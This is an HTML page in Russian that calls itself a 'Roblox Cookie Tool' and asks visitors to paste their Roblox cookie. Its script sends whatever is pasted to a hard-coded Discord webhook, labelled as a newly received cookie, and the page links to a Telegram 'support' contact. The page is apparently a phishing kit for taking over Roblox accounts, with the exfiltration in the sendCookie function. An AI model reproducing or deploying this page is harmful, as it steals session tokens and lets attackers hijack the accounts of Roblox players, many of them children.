<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(-45deg, #0066ff, #808080, #3399ff, #666666);
            background-size: 400% 400%;
            animation: gradient 12s ease infinite;
            padding: 20px;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #1a1a1a;
            font-size: 28px;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
            background: white;
        }

        input:hover {
            border-color: #0066ff;
            box-shadow: 0 0 25px rgba(0, 102, 255, 0.3);
        }

        input:focus {
            border-color: #0066ff;
            box-shadow: 0 0 25px rgba(0, 102, 255, 0.4);
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-primary {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #0066ff;
            color: white;
            box-shadow: 0 5px 15px rgba(0, 102, 255, 0.3);
        }

        .btn-primary:hover {
            background: #0052cc;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.4);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-support {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #ff3333;
            color: white;
            text-decoration: none;
            text-align: center;
            display: inline-block;
            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.3);
        }

        .btn-support:hover {
            background: #cc0000;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 51, 51, 0.4);
        }

        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 15px;
            text-align: center;
            font-weight: 500;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }

        .info {
            margin-top: 15px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }

        footer {
            margin-top: 25px;
            text-align: center;
            color: #999;
            font-size: 12px;
        }

        footer a {
            color: #666;
            text-decoration: none;
        }

        footer a:hover {
            color: #0066ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Roblox Cookie</h1>
        
        <div class="input-group">
            <input type="text" id="cookieInput" placeholder="Вставьте cookie сюда" autocomplete="off">
        </div>

        <div class="button-group">
            <button class="btn-primary" onclick="sendCookie()">Отправить</button>
            <a href="https://t.me/sventsi" target="_blank" rel="noopener noreferrer" class="btn-support">Поддержка</a>
        </div>

        <div id="statusMessage" class="status"></div>
        
        <div class="info">
            Наведите на поле для подсветки
        </div>

        <footer>
            <a href="https://github.com/yourusername/your-repo" target="_blank" rel="noopener noreferrer">GitHub</a> | 
            <a href="https://t.me/sventsi" target="_blank" rel="noopener noreferrer">Telegram</a>
        </footer>
    </div>

    <script>
        function sendCookie() {
            const cookieInput = document.getElementById('cookieInput');
            const statusDiv = document.getElementById('statusMessage');
            const cookie = cookieInput.value.trim();

            // Очищаем старый статус
            statusDiv.className = 'status';
            
            if (!cookie) {
                showStatus('Пожалуйста, введите cookie', 'error');
                return;
            }

            showStatus('Отправка...', '');

            // Webhook URL для Discord
            const webhookUrl = 'https://discord.com/api/webhooks/1481637388227711146/0yj7c1HAwziyYjADJ1KsRuLJ72mfH8R-dfHziSjZW7S8ICrRNGm_tJjxy6c4X0z7gc7S';
            
            // Данные для отправки
            const data = {
                content: '**Новый Roblox Cookie**',
                embeds: [{
                    title: 'Cookie получен',
                    description: '```' + cookie + '```',
                    color: 0x0066ff,
                    timestamp: new Date().toISOString()
                }]
            };

            // Отправка данных
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    showStatus('✅ Cookie успешно отправлен!', 'success');
                    cookieInput.value = ''; // Очищаем поле
                } else {
                    throw new Error('Ошибка отправки');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showStatus('❌ Ошибка при отправке. Попробуйте позже.', 'error');
            });
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.textContent = message;
            statusDiv.className = 'status ' + type;
            
            // Автоматически скрываем сообщение через 5 секунд
            if (type === 'success' || type === 'error') {
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                    setTimeout(() => {
                        statusDiv.style.display = '';
                        statusDiv.className = 'status';
                    }, 100);
                }, 5000);
            }
        }

        // Добавляем отправку по Enter
        document.getElementById('cookieInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendCookie();
            }
        });

        // Добавляем подсветку при наведении на контейнер
        document.querySelector('.input-group').addEventListener('mouseenter', function() {
            this.querySelector('input').style.transform = 'scale(1.02)';
        });

        document.querySelector('.input-group').addEventListener('mouseleave', function() {
            this.querySelector('input').style.transform = 'scale(1)';
        });
    </script>
</body>
</html>
